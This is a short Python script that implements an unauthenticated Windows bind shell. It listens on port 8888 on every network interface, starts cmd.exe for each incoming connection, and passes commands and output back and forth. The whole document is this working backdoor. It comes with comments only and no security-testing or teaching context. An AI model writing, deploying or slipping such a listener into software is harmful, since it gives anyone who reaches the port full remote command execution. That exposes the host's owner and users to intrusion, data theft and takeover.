import socket
import subprocess

# Define the host and port to listen on
host = '0.0.0.0'  # Listen on all available network interfaces
port = 8888  # Specify the port number you want to use

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the host and port
server_socket.bind((host, port))

# Listen for incoming connections
server_socket.listen(1)
print('Listening on {}:{}'.format(host, port))

while True:
    # Accept a client connection
    client_socket, client_address = server_socket.accept()
    print('Accepted connection from {}:{}'.format(client_address[0], client_address[1]))

    # Create a subprocess to run cmd.exe
    cmd_process = subprocess.Popen(['cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    # Continuously send and receive data between the client and cmd.exe process
    while True:
        # Receive data from the client
        client_data = client_socket.recv(4096)

        if not client_data:
            # No more data, connection closed
            break

        # Send the client's data to cmd.exe
        cmd_process.stdin.write(client_data)
        cmd_process.stdin.flush()

        # Read the output from cmd.exe
        cmd_output = cmd_process.stdout.readline()

        # Send the output back to the client
        client_socket.sendall(cmd_output)

    # Close the client socket and terminate the cmd.exe process
    client_socket.close()
    cmd_process.terminate()

# Close the server socket
server_socket.close()
